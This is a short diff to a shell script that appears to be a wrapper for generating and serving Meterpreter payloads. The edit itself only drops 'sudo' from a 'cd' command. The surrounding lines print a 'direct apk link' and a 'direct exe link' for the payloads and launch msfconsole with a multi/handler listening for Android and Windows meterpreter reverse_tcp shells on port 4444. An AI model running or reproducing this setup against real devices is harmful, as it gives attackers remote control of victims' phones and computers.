@@ -123,7 +123,7 @@ echo "${GREEN}direct apk link --> ${RED}http://$z/MT.apk"
 sleep 1
 echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
 sleep 2
-sudo cd meterpreter
+cd meterpreter
 echo "open msf wait..."
 msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD android/meterpreter/reverse_tcp; show options; run'
 elif [ $q = $a ];
@@ -208,7 +208,7 @@ echo "${GREEN}direct apk link --> ${RED}http://$z/MT.exe"
 sleep 1
 echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
 sleep 2
-sudo cd meterpreter
+cd meterpreter
 echo "open msf wait..."
 msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD windows/meterpreter/reverse_tcp; show options; run'
 elif [ $q = $v ];
